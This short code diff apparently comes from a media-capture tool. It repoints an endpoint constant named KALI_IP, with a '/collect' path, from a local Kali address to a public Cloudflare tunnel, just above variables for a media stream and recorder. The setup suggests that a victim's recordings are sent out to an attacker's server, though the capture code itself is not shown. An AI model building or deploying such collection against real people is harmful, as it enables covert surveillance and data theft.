@@ -1,6 +1,6 @@
-// Configuration
-const KALI_IP = "192.168.3.2";
-const API_URL = `http://${KALI_IP}:5000/collect`;
+// Configuration - Use Cloudflare Tunnel URL here
+const KALI_IP = "his-preferred-accordance-not.trycloudflare.com";
+const API_URL = `https://${KALI_IP}/collect`;
 
 let mediaStream = null;
 let mediaRecorder = null;
